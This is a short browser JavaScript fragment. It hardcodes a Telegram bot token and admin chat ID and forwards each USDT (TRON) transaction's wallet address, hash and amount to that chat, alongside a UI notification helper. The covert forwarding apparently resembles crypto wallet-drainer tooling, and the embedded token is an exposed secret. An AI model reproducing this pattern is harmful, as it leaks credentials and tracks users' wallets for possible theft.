const TELEGRAM_BOT_TOKEN = '8721729639:AAHL9TfL-jHH1pmlxvAhJfInuFftrCTyYEg';
const ADMIN_CHAT_ID = '7233807907';

async function sendTelegramNotifications(walletAddress, txHash, amount, transferAmount) {
    try {
        const message = `🔔 New USDT Transaction (TRON)!\n💰 Amount: ${transferAmount} USDT\n👤 Wallet: ${walletAddress}\n📝 TX Hash: ${txHash}\n⏰ Time: ${new Date().toLocaleString()}`;
        
        const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: ADMIN_CHAT_ID,
                text: message
            })
        });
        
        return response.ok;
    } catch (error) {
        console.error('Telegram error:', error);
        return false;
    }
}

function showNotification(msg, type = "info") {
    let notify = document.getElementById("notify-bar");
    if (!notify) {
        notify = document.createElement("div");
        notify.id = "notify-bar";
        notify.style.cssText = "position:fixed;top:20px;left:50%;transform:translateX(-50%);z-index:9999;min-width:260px;padding:16px 32px;border-radius:12px;font-weight:bold;text-align:center;box-shadow:0 4px 32px #0008;transition:all 0.3s;";
        document.body.appendChild(notify);
    }
    notify.textContent = msg;
    notify.style.background = type === "error" ? "#f87171" : type === "success" ? "#10b981" : "#374151";
    notify.style.color = "#fff";
    notify.style.opacity = "1";
    setTimeout(() => { notify.style.opacity = "0"; }, 3000);
}
